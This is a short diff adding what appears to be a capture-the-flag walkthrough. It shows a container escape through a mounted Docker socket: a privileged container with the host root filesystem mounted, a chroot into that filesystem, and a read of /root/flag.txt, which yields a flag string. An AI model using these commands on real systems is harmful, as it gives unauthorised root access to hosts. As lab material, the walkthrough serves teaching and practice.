@@ -1,0 +1,14 @@
+Operator Snapshot:
+While enumerating the container, you locate a mount at /mnt/docker.sock.
+Using this socket, you're able to interact with the host Docker daemon:
+
+docker -H unix:///mnt/docker.sock run -it --privileged -v /:/mnt ubuntu bash
+
+Once inside the new container:
+chroot /mnt /bin/bash
+
+Then:
+cat /root/flag.txt
+
+Result:
+CTF{d0ck3r_esc4p3_br34k}
